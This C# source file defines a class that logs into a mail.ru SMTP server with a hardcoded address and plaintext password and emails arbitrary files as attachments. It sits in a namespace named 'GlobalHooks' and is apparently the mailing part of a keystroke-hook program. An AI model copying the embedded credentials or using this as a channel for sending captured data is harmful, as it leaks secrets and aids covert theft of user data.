using System.Net.Mail;

namespace GlobalHooks
{
    internal class EmailManager
    {
        private readonly SmtpClient _smtpClient;
        private const string Sender = "melehovec.anton@mail.ru";
        private const string Password = "fghtykv";

        private const string Host = "smtp.mail.ru";
        private const int Port = 587;

        public EmailManager()
        {
            _smtpClient = new SmtpClient(Host, Port)
            {
                Credentials = new System.Net.NetworkCredential(Sender, Password),
                EnableSsl = true
            };
        }

        public void SendEmail(string receiver, string topic, string filePath)
        {
            var mail = new MailMessage(Sender, receiver, topic, string.Empty);
            using (var  attachment = new Attachment(filePath))
            {
                mail.Attachments.Add(attachment);
                _smtpClient.Send(mail);
            }
        }
    }
}
